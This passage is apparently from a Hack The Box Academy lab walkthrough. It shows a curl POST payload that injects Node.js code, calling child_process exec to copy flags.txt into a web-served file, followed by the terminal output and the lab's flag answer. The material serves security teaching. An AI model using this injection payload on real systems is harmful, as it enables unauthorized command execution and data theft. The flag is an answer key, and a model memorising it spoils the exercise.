Thus, students need to print its contents out into "css/out.txt":

Code: shell

```shell
curl http://STMIP:STMPO/ping -X POST -d 'debug=true&ip={"ip":"127.0.0.1\"}%27).ip; const { exec } = require(%27child_process%27); exec(%27cat ./flags.txt> css/out.txt%27);//%27).ip;"}'
```

```
┌─[eu-academy-1]─[10.10.14.81]─[htb-ac413848@htb-shjpzcukev]─[~]
└──╼ [★]$ curl http://178.62.88.144:30120/ping -X POST -d 'debug=true&ip={"ip":"127.0.0.1\"}%27).ip; const { exec } = require(%27child_process%27); exec(%27cat ./flags.txt> css/out.txt%27);//%27).ip;"}'

<!DOCTYPE html><head><meta charset="UTF-8"><title>Basic Linux Commands</title><link rel="stylesheet" href="./style.css"></head>
<SNIP>
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.014 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.014/0.014/0.014/0.000 ms
```

At last, when checking the contents of "out.txt", students will find the flag `HTB{c0mm4nd_1nj3c710n_n1nj4}`:

Code: shell

```shell
curl http://STMIP:STMPO/out.txt
```

```
┌─[eu-academy-1]─[10.10.14.81]─[htb-ac413848@htb-shjpzcukev]─[~]
└──╼ [★]$ curl http://178.62.88.144:30120/out.txt

HTB{c0mm4nd_1nj3c710n_n1nj4}
```

Answer: `HTB{c0mm4nd_1nj3c710n_n1nj4}`